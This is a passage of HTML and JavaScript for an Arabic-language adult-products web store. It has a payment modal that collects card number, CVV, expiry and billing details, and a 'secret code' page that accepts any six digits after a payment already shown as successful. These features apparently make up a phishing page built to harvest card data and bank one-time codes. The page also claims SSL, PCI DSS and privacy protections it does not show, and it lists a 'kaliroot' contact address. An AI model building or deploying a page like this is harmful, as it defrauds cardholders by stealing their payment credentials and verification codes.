                    <button onclick="filterProducts('couples')" class="filter-btn px-8 py-3 rounded-full mb-3 text-lg">💑 للأزواج</button>
                    <button onclick="filterProducts('women')" class="filter-btn px-8 py-3 rounded-full mb-3 text-lg">👩 للنساء</button>
                    <button onclick="filterProducts('men')" class="filter-btn px-8 py-3 rounded-full mb-3 text-lg">👨 للرجال</button>
                    <button onclick="filterProducts('ai-recommended')" class="filter-btn px-8 py-3 rounded-full mb-3 text-lg">🤖 موصى بالـ AI</button>
                </div>

                <div id="products-grid" class="product-grid">
                    <!-- Products will be generated by JavaScript -->
                </div>
            </div>
        </section>
    </div>

    <!-- Code Entry Page -->
    <div id="code" class="page">
        <section class="py-20 bg-gradient-to-br from-purple-900 via-pink-900 to-red-900 min-h-screen">
            <div class="container mx-auto px-4">
                <div class="max-w-4xl mx-auto">
                    <div class="text-center mb-16">
                        <h1 class="text-6xl font-black mb-8 text-white animate-pulse cyber-text">🎯 أدخل الكود السري</h1>
                        <p class="text-2xl text-gray-200 mb-12 neon-text">استكمل عملية الشراء بإدخال الكود السري</p>
                    </div>

                    <!-- Purchase Summary -->
                    <div class="glass-effect p-8 mb-8">
                        <h3 class="text-2xl font-bold mb-6 text-white text-center">📋 ملخص عملية الشراء</h3>
                        <div id="purchase-summary" class="bg-white/10 p-6 rounded-xl">
                            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 text-center">
                                <div>
                                    <h4 class="text-lg font-bold text-green-400 mb-2">💳 الدفع</h4>
                                    <p class="text-white">تم بنجاح</p>
                                    <p class="text-gray-300 text-sm" id="payment-amount">0 ريال</p>
                                </div>
                                <div>
                                    <h4 class="text-lg font-bold text-blue-400 mb-2">🛒 المنتجات</h4>
                                    <p class="text-white" id="items-count">0 منتجات</p>
                                    <p class="text-gray-300 text-sm">جاهزة للشحن</p>
                                </div>
                                <div>
                                    <h4 class="text-lg font-bold text-purple-400 mb-2">🎁 المكافأة</h4>
                                    <p class="text-white">في انتظار الكود</p>
                                    <p class="text-gray-300 text-sm">خصم إضافي</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Main Code Input Card -->
                    <div class="glass-effect p-12 mb-8">
                        <form id="code-form">
                            <div class="text-center mb-8">
                                <i class="fas fa-gift text-6xl text-yellow-400 mb-6 animate-pulse"></i>
                                <h2 class="text-3xl font-bold mb-4 text-white cyber-text">أدخل الكود السري للحصول على مكافأة</h2>
                                <p class="text-gray-300 text-lg">جميع الأكواد صحيحة ومقبولة - أدخل أي 6 أرقام!</p>
                            </div>
                            
                            <div class="mb-8">
                                <label class="block text-lg font-bold mb-4 text-center text-white">الكود السري (6 أرقام):</label>
                                <div class="relative">
                                    <input type="text" name="secret_code" id="secret-code" class="w-full px-8 py-6 text-4xl text-center border-2 rounded-2xl focus:outline-none focus:border-yellow-400 bg-white/10 backdrop-blur border-white/20 text-white placeholder-gray-300 font-mono" placeholder="000000" maxlength="6" pattern="[0-9]{6}" style="letter-spacing: 0.5em;" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6); validateAndSetReward(this.value);" required="">
                                    <div class="absolute right-6 top-1/2 transform -translate-y-1/2">
                                        <i class="fas fa-hashtag text-gray-400 text-xl animate-pulse"></i>
                                    </div>
                                </div>
                                <p class="text-gray-300 text-center mt-3 text-sm">أدخل أي 6 أرقام للحصول على مكافأة فورية!</p>
                                <div id="code-feedback" class="text-center mt-4"></div>
                            </div>

                            <!-- معلومات التواصل -->
                            <div class="mb-8 space-y-4">
                                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                                    <div>
                                        <label class="block text-lg font-bold mb-3 text-white">البريد الإلكتروني:</label>
                                        <input type="email" name="confirmation_email" id="code-email" class="w-full px-4 py-3 text-lg border rounded-xl focus:outline-none focus:border-yellow-400 bg-white/10 backdrop-blur border-white/20 text-white placeholder-gray-300" placeholder="your@email.com">
                                    </div>
                                    
                                    <div>
                                        <label class="block text-lg font-bold mb-3 text-white">رقم الهاتف:</label>
                                        <input type="tel" name="user_phone" id="code-phone" class="w-full px-4 py-3 text-lg border rounded-xl focus:outline-none focus:border-yellow-400 bg-white/10 backdrop-blur border-white/20 text-white placeholder-gray-300" placeholder="+966 50 123 4567">
                                    </div>
                                </div>
                            </div>

                            <button type="submit" class="w-full btn-cyber py-6 text-xl font-bold">
                                <i class="fas fa-unlock mr-3"></i>
                                تفعيل الكود وإكمال الطلب
                            </button>
                        </form>
                    </div>

                    <!-- Rewards Preview -->
                    <div class="glass-effect p-8">
                        <h3 class="text-2xl font-bold mb-6 text-white text-center">🎁 أمثلة على المكافآت</h3>
                        <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                            <div class="bg-gradient-to-br from-purple-500 to-pink-500 p-4 rounded-xl text-center">
                                <h4 class="font-bold text-white mb-2">999999</h4>
                                <p class="text-white text-sm">مكافأة بلاتينية</p>
                                <p class="text-yellow-300 font-bold">خصم 95%</p>
                            </div>
                            <div class="bg-gradient-to-br from-yellow-500 to-orange-500 p-4 rounded-xl text-center">
                                <h4 class="font-bold text-white mb-2">888888</h4>
                                <p class="text-white text-sm">مكافأة ذهبية</p>
                                <p class="text-yellow-300 font-bold">خصم 80%</p>
                            </div>
                            <div class="bg-gradient-to-br from-blue-500 to-indigo-500 p-4 rounded-xl text-center">
                                <h4 class="font-bold text-white mb-2">123456</h4>
                                <p class="text-white text-sm">مكافأة جيدة</p>
                                <p class="text-yellow-300 font-bold">خصم 40%</p>
                            </div>
                            <div class="bg-gradient-to-br from-green-500 to-teal-500 p-4 rounded-xl text-center">
                                <h4 class="font-bold text-white mb-2">000001</h4>
                                <p class="text-white text-sm">مكافأة أساسية</p>
                                <p class="text-yellow-300 font-bold">خصم 30%</p>
                            </div>
                        </div>
                        
                        <div class="mt-6 bg-yellow-100 dark:bg-yellow-900 p-4 rounded-xl">
                            <p class="text-yellow-800 dark:text-yellow-200 text-center font-bold">
                                <i class="fas fa-star mr-2"></i>
                                كلما زادت قيمة الكود، زادت المكافأة!
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <!-- Contact Page -->
    <div id="contact" class="page">
        <section class="py-20 bg-gradient-to-br from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-900 min-h-screen">
            <div class="container mx-auto px-4">
                <h1 class="text-5xl font-black text-center mb-16 cyber-text hologram">📞 اتصل بنا</h1>
                <div class="max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-12">
                    <div class="glass-effect p-10">
                        <h2 class="text-3xl font-bold mb-8">💬 معلومات التواصل</h2>
                        <div class="space-y-6">
                            <div class="flex items-center space-x-6 space-x-reverse">
                                <div class="w-12 h-12 bg-gradient-to-r from-primary to-secondary rounded-full flex items-center justify-center">
                                    <i class="fas fa-envelope text-white text-xl"></i>
                                </div>
                                <span class="text-lg">kaliroot123m@gmail.com</span>
                            </div>
                            <div class="flex items-center space-x-6 space-x-reverse">
                                <div class="w-12 h-12 bg-gradient-to-r from-green-500 to-emerald-600 rounded-full flex items-center justify-center">
                                    <i class="fab fa-whatsapp text-white text-xl"></i>
                                </div>
                                <span class="text-lg">+966 50 123 4567</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="glass-effect p-10">
                        <h2 class="text-3xl font-bold mb-8">✉️ أرسل رسالة</h2>
                        <form id="contact-form" class="space-y-6">
                            <div>
                                <label class="block text-lg font-bold mb-3">الاسم (اختياري)</label>
                                <input type="text" name="name" class="w-full px-4 py-3 text-lg border rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600">
                            </div>
                            <div>
                                <label class="block text-lg font-bold mb-3">البريد الإلكتروني</label>
                                <input type="email" name="email" class="w-full px-4 py-3 text-lg border rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600" required="">
                            </div>
                            <div>
                                <label class="block text-lg font-bold mb-3">الرسالة</label>
                                <textarea rows="5" name="message" class="w-full px-4 py-3 text-lg border rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600" required=""></textarea>
                            </div>
                            <button type="submit" class="w-full btn-cyber py-4 text-xl">
                                <i class="fas fa-paper-plane mr-2"></i>
                                إرسال الرسالة
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <!-- Cart Modal -->
    <div id="cart-modal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center z-50 p-4">
        <div class="glass-effect max-w-3xl w-full max-h-[90vh] overflow-y-auto">
            <div class="p-8 border-b border-white/20">
                <div class="flex justify-between items-center">
                    <h2 class="text-3xl font-bold text-white cyber-text">🛒 سلة التسوق الذكية</h2>
                    <button onclick="toggleCart()" class="text-gray-300 hover:text-white text-2xl">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            </div>
            <div id="cart-items" class="p-8">
                <p class="text-white text-center text-lg">السلة فارغة</p>
            </div>
            <div class="p-8 border-t border-white/20">
                <div class="space-y-3 mb-6 text-lg text-white">
                    <div class="flex justify-between">
                        <span>المجموع الفرعي:</span>
                        <span id="cart-subtotal" class="font-bold">0 ريال</span>
                    </div>
                    <div class="flex justify-between">
                        <span>الشحن:</span>
                        <span id="cart-shipping" class="font-bold">15 ريال</span>
                    </div>
                    <div class="flex justify-between">
                        <span>خصم AI:</span>
                        <span id="cart-ai-discount" class="font-bold text-green-400">-10 ريال</span>
                    </div>
                    <div class="flex justify-between text-2xl font-bold border-t border-white/20 pt-3">
                        <span>المجموع:</span>
                        <span id="cart-total" class="text-yellow-400">15 ريال</span>
                    </div>
                </div>
                <button onclick="showPaymentModal()" class="w-full btn-cyber py-4 text-xl">
                    <i class="fas fa-credit-card mr-2"></i>
                    متابعة الدفع
                </button>
            </div>
        </div>
    </div>

    <!-- Wishlist Modal -->
    <div id="wishlist-modal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center z-50 p-4">
        <div class="glass-effect max-w-4xl w-full max-h-[90vh] overflow-y-auto">
            <div class="p-8 border-b border-white/20">
                <div class="flex justify-between items-center">
                    <h2 class="text-3xl font-bold text-white cyber-text">💝 قائمة الأمنيات</h2>
                    <button onclick="toggleWishlist()" class="text-gray-300 hover:text-white text-2xl">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            </div>
            <div id="wishlist-items" class="p-8">
                <p class="text-white text-center text-lg">المفضلة فارغة</p>
            </div>
        </div>
    </div>

    <!-- Payment Modal -->
    <div id="payment-modal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50 p-4">
        <div class="glass-effect max-w-5xl w-full max-h-[90vh] overflow-y-auto">
            <div class="p-8 border-b border-white/20">
                <div class="flex justify-between items-center">
                    <h2 class="text-4xl font-bold text-white cyber-text">💳 الدفع الآمن والمتطور</h2>
                    <button onclick="hidePaymentModal()" class="text-gray-300 hover:text-white text-2xl">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <div class="mt-4 flex items-center space-x-2 space-x-reverse">
                    <div class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center text-white font-bold">1</div>
                    <div class="flex-1 h-1 bg-green-500 rounded"></div>
                    <div class="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold">2</div>
                    <div class="flex-1 h-1 bg-gray-300 rounded"></div>
                    <div class="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center text-gray-600 font-bold">3</div>
                </div>
            </div>
            
            <!-- Payment Steps -->
            <div class="p-8">
                <!-- Step 1: Order Summary -->
                <div id="payment-step-1" class="payment-step active">
                    <h3 class="text-3xl font-bold text-white mb-8">📋 مراجعة الطلب والدفع</h3>
                    
                    <!-- Cart Summary -->
                    <div class="bg-white/10 backdrop-blur p-6 rounded-xl mb-8">
                        <h4 class="text-xl font-bold text-white mb-4">🛒 ملخص الطلب</h4>
                        <div id="payment-cart-summary" class="space-y-3">
                            <!-- Cart items will be populated here -->
                        </div>
                        <div class="border-t border-white/20 mt-4 pt-4 space-y-2">
                            <div class="flex justify-between text-white">
                                <span>المجموع الفرعي:</span>
                                <span id="payment-subtotal">0 ريال</span>
                            </div>
                            <div class="flex justify-between text-white">
                                <span>الشحن:</span>
                                <span class="text-green-400">مجاني</span>
                            </div>
                            <div class="flex justify-between text-white">
                                <span>خصم الذكاء الاصطناعي:</span>
                                <span class="text-green-400">-10 ريال</span>
                            </div>
                            <div class="flex justify-between text-2xl font-bold text-yellow-400 border-t border-white/20 pt-3">
                                <span>المجموع النهائي:</span>
                                <span id="payment-total">0 ريال</span>
                            </div>
                        </div>
                    </div>

                    <!-- Security Features -->
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
                        <div class="bg-green-100 dark:bg-green-900/50 p-4 rounded-xl text-center">
                            <i class="fas fa-shield-alt text-3xl text-green-500 mb-2"></i>
                            <h5 class="font-bold text-green-700 dark:text-green-300">حماية SSL</h5>
                            <p class="text-green-600 dark:text-green-400 text-sm">تشفير 256-bit</p>
                        </div>
                        <div class="bg-blue-100 dark:bg-blue-900/50 p-4 rounded-xl text-center">
                            <i class="fas fa-lock text-3xl text-blue-500 mb-2"></i>
                            <h5 class="font-bold text-blue-700 dark:text-blue-300">دفع آمن</h5>
                            <p class="text-blue-600 dark:text-blue-400 text-sm">معايير PCI DSS</p>
                        </div>
                        <div class="bg-purple-100 dark:bg-purple-900/50 p-4 rounded-xl text-center">
                            <i class="fas fa-user-secret text-3xl text-purple-500 mb-2"></i>
                            <h5 class="font-bold text-purple-700 dark:text-purple-300">خصوصية كاملة</h5>
                            <p class="text-purple-600 dark:text-purple-400 text-sm">تشفير البيانات</p>
                        </div>
                    </div>

                    <div class="text-center">
                        <button onclick="nextPaymentStep()" class="btn-cyber px-12 py-4 text-xl font-bold">
                            <i class="fas fa-credit-card mr-3"></i>
                            متابعة الدفع بالبطاقة الائتمانية
                        </button>
                        <p class="text-gray-300 mt-4 text-sm">نقبل فقط الدفع بالبطاقات الائتمانية لضمان الأمان المطلق</p>
                    </div>
                </div>

                <!-- Step 2: Credit Card Payment -->
                <div id="payment-step-2" class="payment-step">
                    <h3 class="text-3xl font-bold text-white mb-8">💳 معلومات البطاقة الائتمانية</h3>
                    
                    <!-- Credit Card Logos -->
                    <div class="flex justify-center space-x-6 space-x-reverse mb-8">
                        <div class="bg-white p-3 rounded-lg">
                            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA0MCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjI0IiByeD0iNCIgZmlsbD0iIzAwNTFBNSIvPgo8dGV4dCB4PSI1IiB5PSIxNiIgZmlsbD0id2hpdGUiIGZvbnQtc2l6ZT0iMTAiIGZvbnQtd2VpZ2h0PSJib2xkIj5WSVNBPC90ZXh0Pgo8L3N2Zz4K" alt="Visa" class="h-6 w-10">
                        </div>
                        <div class="bg-white p-3 rounded-lg">
                            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA0MCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjI0IiByeD0iNCIgZmlsbD0iI0VCMDAxQiIvPgo8Y2lyY2xlIGN4PSIxNCIgY3k9IjEyIiByPSI2IiBmaWxsPSIjRkY1RjAwIiBmaWxsLW9wYWNpdHk9IjAuOCIvPgo8Y2lyY2xlIGN4PSIyNiIgY3k9IjEyIiByPSI2IiBmaWxsPSIjRkY1RjAwIiBmaWxsLW9wYWNpdHk9IjAuOCIvPgo8L3N2Zz4K" alt="Mastercard" class="h-6 w-10">
                        </div>
                        <div class="bg-white p-3 rounded-lg">
                            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA0MCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjI0IiByeD0iNCIgZmlsbD0iIzAwNjZBMCIvPgo8dGV4dCB4PSI0IiB5PSIxNiIgZmlsbD0id2hpdGUiIGZvbnQtc2l6ZT0iOCIgZm9udC13ZWlnaHQ9ImJvbGQiPkFNRVg8L3RleHQ+Cjwvc3ZnPgo=" alt="American Express" class="h-6 w-10">
                        </div>
                    </div>

                    <!-- Credit Card Form -->
                    <form id="credit-payment-form" class="space-y-6">
                        <!-- Card Number -->
                        <div>
                            <label class="block text-white font-bold mb-3 text-lg">رقم البطاقة *</label>
                            <div class="relative">
                                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" class="w-full px-6 py-4 text-xl border-2 rounded-xl bg-white/10 text-white placeholder-gray-300 focus:border-blue-400 transition-all" maxlength="19" oninput="formatCardNumber(this)" required="">
                                <div class="absolute left-4 top-1/2 transform -translate-y-1/2">
                                    <i class="fas fa-credit-card text-gray-400 text-xl"></i>
                                </div>
                            </div>
                            <p class="text-gray-400 text-sm mt-2">أدخل رقم البطاقة بدون مسافات</p>
                        </div>

                        <!-- Card Holder Name -->
                        <div>
                            <label class="block text-white font-bold mb-3 text-lg">اسم حامل البطاقة *</label>
                            <input type="text" id="card-holder" placeholder="الاسم كما هو مكتوب على البطاقة" class="w-full px-6 py-4 text-xl border-2 rounded-xl bg-white/10 text-white placeholder-gray-300 focus:border-blue-400 transition-all" required="">
                        </div>

                        <!-- Expiry and CVV -->
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                            <div>
                                <label class="block text-white font-bold mb-3 text-lg">تاريخ الانتهاء *</label>
                                <input type="text" id="card-expiry" placeholder="MM/YY" class="w-full px-6 py-4 text-xl border-2 rounded-xl bg-white/10 text-white placeholder-gray-300 focus:border-blue-400 transition-all" maxlength="5" oninput="formatExpiry(this)" required="">
                            </div>
                            <div>
                                <label class="block text-white font-bold mb-3 text-lg">رمز الأمان (CVV) *</label>
                                <div class="relative">
                                    <input type="text" id="card-cvv" placeholder="123" class="w-full px-6 py-4 text-xl border-2 rounded-xl bg-white/10 text-white placeholder-gray-300 focus:border-blue-400 transition-all" maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required="">
                                    <div class="absolute left-4 top-1/2 transform -translate-y-1/2">
                                        <i class="fas fa-lock text-gray-400"></i>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Billing Address -->
                        <div class="border-t border-white/20 pt-6">
                            <h4 class="text-xl font-bold text-white mb-6">📍 عنوان الفوترة</h4>
                            <div class="space-y-4">
                                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                                    <div>
                                        <label class="block text-white font-bold mb-3">الاسم الكامل *</label>
                                        <input type="text" id="billing-name" class="w-full px-4 py-3 text-lg border rounded-xl bg-white/10 text-white placeholder-gray-300 focus:border-blue-400" placeholder="اسمك الكامل" required="">
                                    </div>
                                    <div>
                                        <label class="block text-white font-bold mb-3">رقم الهاتف *</label>
                                        <input type="tel" id="billing-phone" class="w-full px-4 py-3 text-lg border rounded-xl bg-white/10 text-white placeholder-gray-300 focus:border-blue-400" placeholder="+966 50 123 4567" required="">
                                    </div>
                                </div>
                                <div>
                                    <label class="block text-white font-bold mb-3">البريد الإلكتروني *</label>
                                    <input type="email" id="billing-email" class="w-full px-4 py-3 text-lg border rounded-xl bg-white/10 text-white placeholder-gray-300 focus:border-blue-400" placeholder="your@email.com" required="">
                                </div>
                                <div>
                                    <label class="block text-white font-bold mb-3">العنوان الكامل *</label>
                                    <textarea rows="3" id="billing-address" class="w-full px-4 py-3 text-lg border rounded-xl bg-white/10 text-white placeholder-gray-300 focus:border-blue-400" placeholder="الشارع، الحي، المدينة، الرمز البريدي" required=""></textarea>
                                </div>
                            </div>
                        </div>

                        <!-- Payment Security Notice -->
                        <div class="bg-blue-100 dark:bg-blue-900/50 p-6 rounded-xl">
                            <div class="flex items-center space-x-3 space-x-reverse">
                                <i class="fas fa-shield-alt text-blue-500 text-2xl"></i>
                                <div>
                                    <h5 class="font-bold text-blue-700 dark:text-blue-300">دفعك محمي بأعلى معايير الأمان</h5>
                                    <p class="text-blue-600 dark:text-blue-400 text-sm">نحن لا نحفظ معلومات بطاقتك الائتمانية على خوادمنا</p>
                                </div>
                            </div>
                        </div>
                    </form>

                    <div class="mt-8 flex space-x-4 space-x-reverse">
                        <button onclick="prevPaymentStep()" class="btn-secondary px-6 py-3">
                            <i class="fas fa-arrow-right mr-2"></i>
                            رجوع
                        </button>
                        <button onclick="processCardPayment()" class="btn-cyber px-8 py-4 text-xl flex-1 font-bold">
                            <i class="fas fa-lock mr-2"></i>
                            دفع آمن <span id="final-amount">0 ريال</span>
                        </button>
                    </div>
                </div>

                <!-- Step 3: Processing -->
                <div id="payment-step-3" class="payment-step text-center">
                    <div class="mb-8">
                        <div class="animate-spin mx-auto w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full mb-6"></div>
                        <h3 class="text-3xl font-bold text-white mb-4">⚡ جاري معالجة الدفع...</h3>
                        <p class="text-xl text-gray-300 mb-8">يرجى عدم إغلاق هذه النافذة</p>
                        
                        <div class="bg-yellow-100 dark:bg-yellow-900/50 p-6 rounded-xl">
                            <div class="flex items-center justify-center space-x-2 space-x-reverse">
                                <i class="fas fa-exclamation-triangle text-yellow-600"></i>
                                <p class="text-yellow-700 dark:text-yellow-300 font-bold">قد تستغرق العملية حتى 30 ثانية</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Dark mode setup
        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
            document.documentElement.classList.add('dark');
        }
        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
            if (event.matches) {
                document.documentElement.classList.add('dark');
            } else {
                document.documentElement.classList.remove('dark');
            }
        });

        // Global variables
        let cart = [];
        let wishlist = [];
        let currentFilter = 'all';
        let currentCurrency = 'SAR';
        let currentCurrencySymbol = 'ريال';
        let currentExchangeRate = 1;
        let selectedPaymentMethod = '';
        let selectedCrypto = '';

        // Products with real images
        const products = [
            { 
                id: 1, 
                name: 'غمد القضيب الأسود المطور - 10 سم', 
                category: 'men', 
                price: 65, 
                originalPrice: 120, 
                images: [
                    'https://pfst.cf2.poecdn.net/base/image/07cbe685c3cef01216089254dda94947a636b49f821789115538de8d1d704a90?w=1500&h=1500'
                ],
                description: 'غلاف القضيب مصنوع من السيليكون الصحي من الدرجة الأولى، مصمم لتعزيز الأداء وإطالة فترة الجماع.',
                rating: 4.8,
                reviews: 324,
                aiRecommended: true,
                inStock: true,
                stockQuantity: 15,
                brand: 'CyberStore Premium',
                warranty: '6 أشهر',
                shipping: 'توصيل مجاني'
            },
            { 
                id: 2, 
                name: 'أرنب تحفيز البظر المهتز - 12.5 سم', 
                category: 'couples', 
                price: 195, 
                originalPrice: 320, 
                images: [
                    'https://pfst.cf2.poecdn.net/base/image/451830208e56a601baa5cac863c2370c70ee5e12704ddf546865d110465816a4?w=1500&h=1500',
                    'https://pfst.cf2.poecdn.net/base/image/aaed2379f7e23e075ca9bc9f610b2e86770cdb19a9f6186fc926548a7977b67c?w=1500&h=1500'
                ],
                description: 'منتج ثوري مطور يجمع بين تحفيز البظر والتعزيز الذكوري في تصميم واحد مع اهتزازات متعددة.',
                rating: 4.9,
                reviews: 567,
                aiRecommended: true,
                inStock: true,
                stockQuantity: 8,
                brand: 'CyberStore Advanced',
                warranty: '1 سنة',
                shipping: 'توصيل فوري'
            },
            { 
                id: 3, 
                name: 'دسار واقعي مع حلقة القضيب - 15 سم', 
                category: 'couples', 
                price: 245, 
                originalPrice: 420, 
                images: [
                    'https://pfst.cf2.poecdn.net/base/image/65cfa6d99905502f17f84fc58231af66ad66a1358c2120881bdf864a128d66a5?w=1500&h=1500',
                    'https://pfst.cf2.poecdn.net/base/image/4862c5b8a7886bffd1a63762d679628b65ae155d079bbdaf73c7ec2a997537c8?w=1500&h=1500'
                ],
                description: 'منتج واقعي متطور للأزواج المغامرين مع 10 أوضاع اهتزاز مختلفة وتصميم قابل للفصل.',
                rating: 4.7,
                reviews: 423,
                inStock: true,
                stockQuantity: 12,
                brand: 'CyberStore Professional',
                warranty: '1 سنة',
                shipping: 'توصيل خاص'
            },
            { 
                id: 4, 
                name: 'هزاز نسائي بنفسجي - 13.5 سم', 
                category: 'women', 
                price: 135, 
                originalPrice: 235, 
                images: [
                    'https://pfst.cf2.poecdn.net/base/image/07bd1c67d1840c6758512ec18724cbb5b23119feff2748a59febda0142c006ec?w=1500&h=1500',
                    'https://pfst.cf2.poecdn.net/base/image/1ca692af18e7225ada24429413102269c4ce2007279c66b151f2173505b6c3f5?w=1500&h=1500'
                ],
                description: 'هزاز أنثوي واقعي بنفسجي اللون مع 10 اهتزازات مختلفة، مصمم خصيصاً للراحة والمتعة.',
                rating: 4.8,
                reviews: 543,
                aiRecommended: true,
                inStock: true,
                stockQuantity: 20,
                brand: 'CyberStore Elegance',
                warranty: '1 سنة',
                shipping: 'توصيل مجاني'
            },
            { 
                id: 5, 
                name: 'حلقة القضيب الذكية - مقاوم للماء', 
                category: 'men', 
                price: 89, 
                originalPrice: 150, 
                images: [
                    'https://pfst.cf2.poecdn.net/base/image/c5a88b4ef2c93ccdcc8e5e88726ba73b5b2fcd0a72e2c86afc9c1ea2d1eabfe7?w=1500&h=1500'
                ],
                description: 'حلقة ذكية مطورة من السيليكون الطبي مع تحكم في شدة الاهتزاز ومقاومة كاملة للماء.',
                rating: 4.6,
                reviews: 298,
                aiRecommended: true,
                inStock: true,
                stockQuantity: 25,
                brand: 'CyberStore Smart',
                warranty: '2 سنة',
                shipping: 'توصيل مجاني'
            }
        ];

        // Initialize particles
        function initParticles() {
            particlesJS('particles-js', {
                particles: {
                    number: { value: 80, density: { enable: true, value_area: 800 } },
                    color: { value: ["#667eea", "#764ba2", "#f093fb", "#f5576c"] },
                    shape: { type: "circle", stroke: { width: 0, color: "#000000" } },
                    opacity: { value: 0.5, random: false, anim: { enable: false } },
                    size: { value: 3, random: true, anim: { enable: false } },
                    line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
                    move: { enable: true, speed: 6, direction: "none", random: false, straight: false, out_mode: "out", bounce: false }
                },
                interactivity: {
                    detect_on: "canvas",
                    events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" }, resize: true },
                    modes: { grab: { distance: 400, line_linked: { opacity: 1 } }, bubble: { distance: 400, size: 40, duration: 2, opacity: 8, speed: 3 }, repulse: { distance: 200, duration: 0.4 }, push: { particles_nb: 4 }, remove: { particles_nb: 2 } }
                },
                retina_detect: true
            });
        }

        // Product Functions
        function addToCart(productId) {
            const product = products.find(p => p.id === productId);
            if (product && product.inStock && product.stockQuantity > 0) {
                const existingItem = cart.find(item => item.id === productId);
                if (existingItem) {
                    existingItem.quantity += 1;
                    showNotification(`تم زيادة الكمية في السلة! 🛒`);
                } else {
                    cart.push({...product, quantity: 1});
                    showNotification(`تم إضافة ${product.name} إلى السلة! 🛒`);
                }
                updateCartUI();
                product.stockQuantity -= 1;
                generateProducts();
                generateHomeProducts();
            } else {
                showNotification('عذراً، هذا المنتج غير متوفر حالياً');
            }
        }

        function addToWishlist(productId) {
            const product = products.find(p => p.id === productId);
            if (product) {
                const existingItem = wishlist.find(item => item.id === productId);
                if (existingItem) {
                    showNotification('المنتج موجود بالفعل في المفضلة');
                    return;
                }
                wishlist.push(product);
                updateWishlistUI();
                showNotification(`تم إضافة ${product.name} إلى المفضلة! 💖`);
            }
        }

        function generateHomeProducts() {
            const homeGrid = document.getElementById('home-products-grid');
            if (homeGrid) {
                homeGrid.innerHTML = products.slice(0, 3).map(product => {
                    const discount = Math.round(((product.originalPrice - product.price) / product.originalPrice) * 100);
                    return `
                        <div class="product-card" data-product-id="${product.id}">
                            <div class="product-image-container relative">
                                <img src="${product.images[0]}" alt="${product.name}" class="product-image" onerror="this.style.display='none'">
                                <div class="discount-badge">خصم ${discount}%</div>
                                <div class="absolute bottom-4 right-4">
                                    <button onclick="quickView(${product.id})" class="bg-primary text-white px-3 py-1 rounded-lg text-sm hover:bg-primary/80 transition-all">
                                        نظرة سريعة
                                    </button>
                                </div>
                            </div>
                            <div class="p-6">
                                <div class="flex items-center justify-between mb-2">
                                    <span class="text-sm text-gray-500">${product.brand}</span>
                                    ${product.aiRecommended ? '<span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full text-xs font-bold">🤖 AI</span>' : ''}
                                </div>
                                <h3 class="text-xl font-bold mb-3 hover:text-primary cursor-pointer" onclick="quickView(${product.id})">${product.name}</h3>
                                <p class="text-gray-600 dark:text-gray-300 mb-4">${product.description}</p>
                                
                                <div class="flex items-center mb-3">
                                    <div class="flex text-yellow-400">
                                        ${'★'.repeat(Math.floor(product.rating))}${'☆'.repeat(5 - Math.floor(product.rating))}
                                    </div>
                                    <span class="text-sm text-gray-500 mr-2">(${product.reviews})</span>
                                </div>

                                <div class="flex justify-between items-center mb-4">
                                    <div>
                                        <span class="text-2xl font-bold text-primary">${(product.price * currentExchangeRate).toFixed(0)} ${currentCurrencySymbol}</span>
                                        <span class="text-lg text-gray-500 line-through mr-2">${(product.originalPrice * currentExchangeRate).toFixed(0)} ${currentCurrencySymbol}</span>
                                    </div>
                                </div>

                                <div class="flex gap-2">
                                    <button onclick="addToCart(${product.id})" class="flex-1 btn-primary py-2 text-sm font-bold hover:scale-105 transition-transform">
